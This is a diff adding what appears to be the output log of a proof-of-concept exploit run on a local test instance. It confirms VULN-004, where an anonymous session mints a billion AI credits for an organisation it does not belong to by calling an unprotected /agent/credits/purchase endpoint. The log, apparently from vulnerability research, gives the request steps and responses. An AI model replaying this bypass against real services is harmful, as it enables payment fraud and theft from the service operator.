@@ -1,0 +1,15 @@
+========================================================================
+VULN-004: Unlimited AI-credit minting via /agent/credits/purchase
+target: API=http://localhost:21527  dashboard=http://localhost:21526
+========================================================================
+[INFO] route apps/api/src/routes/agent/agent.ts:301-310 gated by authOrApiKeyMiddleware
+[INFO] auth-or-api-key.ts:12-19 passes for ANY session — no HMAC, no org-admin, no membership
+[INFO] target org 48bbdff8-2ad5-46a3-a259-2ca3d52677dd ai_credit_balance before = 0
+[SETUP] minting an anonymous session (unauthenticated) — the bug is reachable with no account
+[SETUP] anon user=a3566fc8-56e6-4171-aa38-ecbb9f6eb730 isAnonymous=True orgRoles={} (NOT a member of the target org)
+[STEP] POST /agent/credits/purchase orgId=48bbdff8-2ad5-46a3-a259-2ca3d52677dd tokens=1000000000 providerOrderId=cvehunt-ord_9a9e24ae-3c72584e
+[INFO]   response: HTTP 200 {"success":true,"data":{"id":5,"orgId":"48bbdff8-2ad5-46a3-a259-2ca3d52677dd","triggeredBy":null,"provider":"polar","providerOrderId":"cvehunt-ord_9a9e24ae-3c72584e","tokens":1000000000,"quantity":1,"
+[INFO] target org ai_credit_balance after = 1000000000
+[PROOF] balance rose by 1000000000 (>= 1000000000) with no payment/signature/membership — an anonymous actor minted credits for an org it does not belong to
+==> VULN-004: CONFIRMED — anon session mints arbitrary AI credits for any org (no HMAC/authz)
+[OK] exploit confirmed — unbounded AI-credit minting, unauthenticated
